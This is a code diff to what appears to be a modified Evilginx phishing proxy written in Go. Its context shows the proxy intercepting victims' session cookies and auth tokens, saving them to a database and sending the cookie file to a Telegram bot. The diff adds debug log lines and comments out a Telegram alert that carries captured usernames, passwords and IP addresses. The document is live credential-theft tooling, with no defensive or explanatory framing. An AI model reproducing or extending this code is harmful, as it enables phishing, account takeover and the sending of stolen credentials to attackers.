@@ -1359,20 +1359,28 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 
 			if is_cookie_auth && is_body_auth && is_http_auth {
+
+
+				log.Info("Checking if all auth tokens are intercepted")
+
 				// we have all auth tokens
 				if s, ok := p.sessions[ps.SessionId]; ok {
 					if !s.IsDone {
 						log.Success("[%d] all authorization tokens intercepted!", ps.Index)
-
+						log.Info("verifying cookies 1")
 						if err := p.db.SetSessionCookieTokens(ps.SessionId, s.CookieTokens); err != nil {
 							log.Error("database: %v", err)
+							log.Info("verifying cookies 2")
 						}
 						if err := p.db.SetSessionBodyTokens(ps.SessionId, s.BodyTokens); err != nil {
 							log.Error("database: %v", err)
+							log.Info("verifying cookies 3")
 						}
 						if err := p.db.SetSessionHttpTokens(ps.SessionId, s.HttpTokens); err != nil {
 							log.Error("database: %v", err)
+							log.Info("verifying cookies 4")
 						}
+						log.Info("verifying cookies 5")
 						s.Finish(false)
 
 						// Send cookies to Telegram immediately after session is finished
@@ -1380,12 +1388,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							go func() {
 								// Small delay to ensure all data is saved
 								time.Sleep(2 * time.Second)
+								log.Info("verifying cookies 6")
 								if err := p.telegram.SendEvilginxCookiesFile(ps.SessionId, p.db); err != nil {
 									log.Error("Failed to send cookies to Telegram: %v", err)
+									log.Info("verifying cookies 7")
 								}
 							}()
 						}
-
+						log.Info("verifying cookies 8")
 						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 							rid, ok := s.Params["rid"]
 							if ok && rid != "" {
@@ -2213,7 +2223,7 @@ func (p *HttpProxy) setSessionUsername(sid string, username string) {
 		
 		// إذا كان كل من اسم المستخدم وكلمة المرور متوفرين، أرسل إشعارًا
 		if s.Username != "" && s.Password != "" {
-			go p.telegram.NotifyCredentialsCaptured(sid, s.Name, s.Username, s.Password, s.RemoteAddr)
+			// go p.telegram.NotifyCredentialsCaptured(sid, s.Name, s.Username, s.Password, s.RemoteAddr)
 		}
 	}
 }
